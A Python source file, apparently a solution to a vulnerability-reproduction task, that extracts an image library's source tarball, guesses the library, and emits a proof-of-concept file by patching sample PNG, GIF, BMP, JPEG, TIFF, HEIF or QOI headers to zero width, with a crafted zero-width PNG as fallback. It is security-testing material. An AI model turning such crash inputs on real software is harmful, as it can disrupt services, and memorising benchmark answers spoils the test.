import os
import tarfile
import tempfile
import struct
import zlib


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as tmpdir:
            self._extract_tar(src_path, tmpdir)
            project = self._identify_project(tmpdir, os.path.basename(src_path))
            poc = self._generate_from_samples(tmpdir, project)
            if poc is None:
                poc = self._generate_fallback(project)
            return poc

    def _extract_tar(self, src_path: str, dst_dir: str) -> None:
        try:
            with tarfile.open(src_path, "r:*") as tar:
                tar.extractall(dst_dir)
        except Exception:
            # If extraction fails, we will rely on the generic fallback PoC.
            pass

    def _identify_project(self, root_dir: str, src_basename: str):
        name_aliases = {
            "png": ["libpng", "png"],
            "gif": ["giflib", "gif"],
            "bmp": ["bmp"],
            "jpeg": ["jpeg", "libjpeg", "mozjpeg", "jpg"],
            "tiff": ["tiff", "libtiff"],
            "webp": ["webp"],
            "heif": ["heif", "heic"],
            "avif": ["avif"],
            "jxl": ["jxl", "jpegxl", "jpeg_xl", "libjxl"],
            "qoi": ["qoi"],
            "stb": ["stb_image", "stbimage"],
            "openexr": ["openexr", "imf"],
        }

        content_tokens = {
            "png": ["libpng", "PNG_LIBPNG_VER", "png_struct", "png_create_read_struct"],
            "gif": ["giflib", "DGifOpen", "EGifOpen", "GifFileType"],
            "bmp": ["bitmapfileheader", "bmp "],
            "jpeg": ["libjpeg", "jpeglib.h", "jpeg_read_header"],
            "tiff": ["libtiff", "tiffio.h", "TIFFOpen"],
            "webp": ["libwebp", "webpdecode", "webp/encode.h"],
            "heif": ["libheif", "heif_context", "heif_image"],
            "avif": ["libavif", "avifImage", "avif.h"],
            "jxl": ["libjxl", "jxl/", "JPEG XL"],
            "qoi": ["qoi.h", "qoif", "QOI_MAGIC"],
            "stb": ["stb_image.h", "STB_IMAGE_IMPLEMENTATION"],
            "openexr": ["OpenEXR", "ImfHeader", "exr"],
        }

        scores = {k: 0 for k in name_aliases.keys()}

        base = src_basename.lower()
        for key, aliases in name_aliases.items():
            for alias in aliases:
                if alias in base:
                    scores[key] += 5

        try:
            for entry in os.listdir(root_dir):
                name = entry.lower()
                for key, aliases in name_aliases.items():
                    for alias in aliases:
                        if alias in name:
                            scores[key] += 3
        except Exception:
            pass

        max_files = 400
        n_files = 0
        for dirpath, dirnames, filenames in os.walk(root_dir):
            for fname in filenames:
                if n_files >= max_files:
                    break
                ext = os.path.splitext(fname)[1].lower()
                if ext not in (
                    ".c",
                    ".cc",
                    ".cpp",
                    ".cxx",
                    ".h",
                    ".hpp",
                    ".hh",
                    ".txt",
                    ".md",
                    ".cmake",
                    ".cmake.in",
                    ".java",
                ):
                    continue
                path = os.path.join(dirpath, fname)
                try:
                    with open(path, "rb") as f:
                        chunk = f.read(4096)
                except Exception:
                    continue
                n_files += 1
                lower = chunk.lower()
                for key, tokens in content_tokens.items():
                    for tok in tokens:
                        try:
                            btok = tok.encode("ascii")
                        except Exception:
                            continue
                        if btok in lower:
                            scores[key] += 2
            if n_files >= max_files:
                break

        best_key = None
        best_score = 0
        for k, v in scores.items():
            if v > best_score:
                best_score = v
                best_key = k

        if best_score == 0:
            return None
        return best_key

    def _generate_from_samples(self, root_dir: str, project):
        patchers = {
            ".png": self._patch_png_zero_dims,
            ".gif": self._patch_gif_zero_dims,
            ".bmp": self._patch_bmp_zero_dims,
            ".dib": self._patch_bmp_zero_dims,
            ".qoi": self._patch_qoi_zero_dims,
            ".jpg": self._patch_jpeg_zero_dims,
            ".jpeg": self._patch_jpeg_zero_dims,
            ".tif": self._patch_tiff_zero_dims,
            ".tiff": self._patch_tiff_zero_dims,
            ".heif": self._patch_heif_zero_dims,
            ".heic": self._patch_heif_zero_dims,
            ".avif": self._patch_heif_zero_dims,
            ".webp": self._patch_webp_zero_dims,
            ".jxl": self._patch_jxl_zero_dims,
        }

        project_exts = {
            "png": [".png"],
            "gif": [".gif"],
            "bmp": [".bmp", ".dib"],
            "jpeg": [".jpg", ".jpeg"],
            "tiff": [".tif", ".tiff"],
            "heif": [".heif", ".heic"],
            "avif": [".avif"],
            "webp": [".webp"],
            "jxl": [".jxl"],
            "qoi": [".qoi"],
        }

        files_by_ext = {ext: [] for ext in patchers}
        for dirpath, dirnames, filenames in os.walk(root_dir):
            for fname in filenames:
                ext = os.path.splitext(fname)[1].lower()
                if ext in files_by_ext:
                    files_by_ext[ext].append(os.path.join(dirpath, fname))

        prioritized_exts = []
        if project and project in project_exts:
            for ext in project_exts[project]:
                if ext in patchers and ext not in prioritized_exts:
                    prioritized_exts.append(ext)
        for ext in patchers:
            if ext not in prioritized_exts:
                prioritized_exts.append(ext)

        for ext in prioritized_exts:
            paths = files_by_ext.get(ext)
            if not paths:
                continue
            patcher = patchers[ext]
            for path in paths:
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size <= 0 or size > 10 * 1024 * 1024:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except Exception:
                    continue
                try:
                    patched = patcher(data)
                except Exception:
                    patched = None
                if patched:
                    return patched
        return None

    def _generate_fallback(self, project):
        return self._generate_png_zero_width()

    def _generate_png_zero_width(self) -> bytes:
        width = 0
        height = 1
        bit_depth = 8
        color_type = 2  # truecolor
        compression = 0
        filter_method = 0
        interlace = 0
        ihdr_data = struct.pack(
            ">IIBBBBB",
            width,
            height,
            bit_depth,
            color_type,
            compression,
            filter_method,
            interlace,
        )
        ihdr_length = struct.pack(">I", len(ihdr_data))
        ihdr_crc = struct.pack(
            ">I", zlib.crc32(b"IHDR" + ihdr_data) & 0xFFFFFFFF
        )

        raw = b"\x00"  # one filter byte for a zero-width row
        idat_data = zlib.compress(raw)
        idat_length = struct.pack(">I", len(idat_data))
        idat_crc = struct.pack(
            ">I", zlib.crc32(b"IDAT" + idat_data) & 0xFFFFFFFF
        )

        iend_data = b""
        iend_length = struct.pack(">I", 0)
        iend_crc = struct.pack(
            ">I", zlib.crc32(b"IEND" + iend_data) & 0xFFFFFFFF
        )

        png_sig = b"\x89PNG\r\n\x1a\n"
        return b"".join(
            [
                png_sig,
                ihdr_length,
                b"IHDR",
                ihdr_data,
                ihdr_crc,
                idat_length,
                b"IDAT",
                idat_data,
                idat_crc,
                iend_length,
                b"IEND",
                iend_data,
                iend_crc,
            ]
        )

    def _patch_png_zero_dims(self, data: bytes):
        if len(data) < 33:
            return None
        if not data.startswith(b"\x89PNG\r\n\x1a\n"):
            return None
        if data[12:16] != b"IHDR":
            return None
        ihdr_len = struct.unpack(">I", data[8:12])[0]
        if ihdr_len < 8 or len(data) < 8 + 4 + 4 + ihdr_len + 4:
            return None
        ihdr_data_offset = 16
        ihdr_data_end = ihdr_data_offset + ihdr_len
        ihdr_data = bytearray(data[ihdr_data_offset:ihdr_data_end])
        # width = 0, height = 1
        ihdr_data[0:4] = b"\x00\x00\x00\x00"
        ihdr_data[4:8] = b"\x00\x00\x00\x01"
        new_crc = struct.pack(
            ">I", zlib.crc32(b"IHDR" + ihdr_data) & 0xFFFFFFFF
        )
        out = bytearray(data)
        out[ihdr_data_offset:ihdr_data_end] = ihdr_data
        out[ihdr_data_end:ihdr_data_end + 4] = new_crc
        return bytes(out)

    def _patch_gif_zero_dims(self, data: bytes):
        if len(data) < 10:
            return None
        if not (data.startswith(b"GIF87a") or data.startswith(b"GIF89a")):
            return None
        out = bytearray(data)
        # logical screen width = 0, height = 1
        out[6:8] = b"\x00\x00"
        out[8:10] = b"\x01\x00"
        return bytes(out)

    def _patch_bmp_zero_dims(self, data: bytes):
        if len(data) < 26:
            return None
        if data[0:2] != b"BM":
            return None
        out = bytearray(data)
        # width = 0, height = 1 (little-endian)
        out[18:22] = b"\x00\x00\x00\x00"
        out[22:26] = b"\x01\x00\x00\x00"
        return bytes(out)

    def _patch_qoi_zero_dims(self, data: bytes):
        if len(data) < 14:
            return None
        if data[0:4] != b"qoif":
            return None
        out = bytearray(data)
        # width = 0, height = 1 (big-endian)
        out[4:8] = b"\x00\x00\x00\x00"
        out[8:12] = b"\x00\x00\x00\x01"
        return bytes(out)

    def _patch_jpeg_zero_dims(self, data: bytes):
        if len(data) < 4 or not data.startswith(b"\xFF\xD8"):
            return None
        out = bytearray(data)
        i = 2
        while i + 4 <= len(out):
            if out[i] != 0xFF:
                i += 1
                continue
            marker = out[i + 1]
            i += 2
            if marker == 0xD9:  # EOI
                break
            if marker == 0xDA:  # SOS - start of scan
                break
            if marker == 0x01 or 0xD0 <= marker <= 0xD7:
                continue
            if i + 2 > len(out):
                break
            seg_len = (out[i] << 8) | out[i + 1]
            if seg_len < 2 or i + seg_len > len(out):
                break
            if marker in (
                0xC0,
                0xC1,
                0xC2,
                0xC3,
                0xC5,
                0xC6,
                0xC7,
                0xC9,
                0xCA,
                0xCB,
                0xCD,
                0xCE,
                0xCF,
            ):
                if seg_len >= 8:
                    height_off = i + 3
                    width_off = i + 5
                    if width_off + 2 <= len(out):
                        # height = 1, width = 0
                        out[height_off:height_off + 2] = b"\x00\x01"
                        out[width_off:width_off + 2] = b"\x00\x00"
                        return bytes(out)
            i += seg_len
        return None

    def _patch_tiff_zero_dims(self, data: bytes):
        if len(data) < 8:
            return None
        endian = data[0:2]
        if endian == b"II":
            def unpack16(b): return b[0] | (b[1] << 8)
            def unpack32(b): return b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)
            def pack16(v): return bytes((v & 0xFF, (v >> 8) & 0xFF))
            def pack32(v): return bytes((v & 0xFF, (v >> 8) & 0xFF, (v >> 16) & 0xFF, (v >> 24) & 0xFF))
        elif endian == b"MM":
            def unpack16(b): return (b[0] << 8) | b[1]
            def unpack32(b): return (b[0] << 24) | (b[1] << 16) | (b[2] << 8) | b[3]
            def pack16(v): return bytes(((v >> 8) & 0xFF, v & 0xFF))
            def pack32(v): return bytes(((v >> 24) & 0xFF, (v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF))
        else:
            return None
        if unpack16(data[2:4]) != 42:
            return None
        first_ifd = unpack32(data[4:8])
        if first_ifd >= len(data) - 2:
            return None
        out = bytearray(data)
        offset = first_ifd
        modified = False
        while offset + 2 <= len(out):
            if offset + 2 > len(out):
                break
            num_entries = unpack16(out[offset:offset + 2])
            offset += 2
            for _ in range(num_entries):
                if offset + 12 > len(out):
                    break
                tag = unpack16(out[offset:offset + 2])
                type_ = unpack16(out[offset + 2:offset + 4])
                count = unpack32(out[offset + 4:offset + 8])
                value_off_bytes = out[offset + 8:offset + 12]
                value_off = unpack32(value_off_bytes)
                if tag in (256, 257):  # width/height
                    if type_ == 3 and count == 1:  # SHORT inline
                        out[offset + 8:offset + 10] = pack16(0 if tag == 256 else 1)
                        modified = True
                    elif type_ == 4 and count == 1:  # LONG inline
                        out[offset + 8:offset + 12] = pack32(0 if tag == 256 else 1)
                        modified = True
                    else:
                        size = 2 if type_ == 3 else 4
                        if value_off + size <= len(out):
                            if type_ == 3:
                                out[value_off:value_off + 2] = pack16(0 if tag == 256 else 1)
                            elif type_ == 4:
                                out[value_off:value_off + 4] = pack32(0 if tag == 256 else 1)
                            modified = True
                offset += 12
            if offset + 4 > len(out):
                break
            next_ifd = unpack32(out[offset:offset + 4])
            if next_ifd == 0:
                break
            offset = next_ifd
        if not modified:
            return None
        return bytes(out)

    def _patch_heif_zero_dims(self, data: bytes):
        if b"ispe" not in data:
            return None
        out = bytearray(data)
        modified = False
        idx = 0
        total = len(out)
        while True:
            pos = data.find(b"ispe", idx)
            if pos == -1:
                break
            if pos + 16 > total:
                break
            # width and height are 32-bit big-endian after version/flags (4 bytes)
            out[pos + 8:pos + 12] = b"\x00\x00\x00\x00"  # width = 0
            out[pos + 12:pos + 16] = b"\x00\x00\x00\x01"  # height = 1
            modified = True
            idx = pos + 16
        if not modified:
            return None
        return bytes(out)

    def _patch_webp_zero_dims(self, data: bytes):
        # Not implemented: dimensions are constrained to be non-zero in spec.
        return None

    def _patch_jxl_zero_dims(self, data: bytes):
        # Not implemented: JPEG XL header structure is complex; return None.
        return None
